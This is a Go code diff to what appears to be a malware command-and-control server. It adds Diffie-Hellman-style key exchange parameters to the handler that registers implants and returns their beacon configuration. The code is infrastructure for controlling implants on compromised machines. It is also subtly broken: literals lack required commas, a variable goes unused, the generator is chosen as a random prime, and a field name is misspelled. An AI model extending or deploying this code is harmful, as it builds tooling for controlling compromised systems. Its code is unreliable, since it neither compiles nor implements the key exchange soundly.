@@ -1,10 +1,11 @@
 package main
 
 import (
-	"github.com/gin-gonic/gin"
-	"gorm.io/gorm"
 	"net/http"
 	"strconv"
+	"keyex"
+	"github.com/gin-gonic/gin"
+	"gorm.io/gorm"
 )
 
 type HTTPSListener struct {
@@ -33,6 +34,12 @@ func (l *HTTPSListener) listen() {
 }
 
 func (l *HTTPSListener) Register(c *gin.Context) {
+	p := generatePrime()
+	g := generatePrime()
+	server_prime := generatePrime()
+	server_private_key := generatePrivateKey(server_prime)
+	server_public_key := calculatePublicKey(p, server_private_key, g)
+
 	var sysInfo SystemInfo
 	if err := c.ShouldBindJSON(&sysInfo); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
@@ -45,6 +52,9 @@ func (l *HTTPSListener) Register(c *gin.Context) {
 		Dwell:        "30s",
 		Jitter:       0,
 		CommProtocol: DEFAULT_IMPLANT_COMM_PROTOCOL,
+		p: p, 
+		g: g, 
+		SeverPubKey: server_public_key
 	}
 	if err := l.db.Create(implant).Error; err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
@@ -57,6 +67,9 @@ func (l *HTTPSListener) Register(c *gin.Context) {
 		"config": gin.H{
 			"dwell":  implant.Dwell,
 			"jitter": implant.Jitter,
+			"p": p,
+			"g": g,
+			"server public key": server_public_key
 		},
 	})
 }
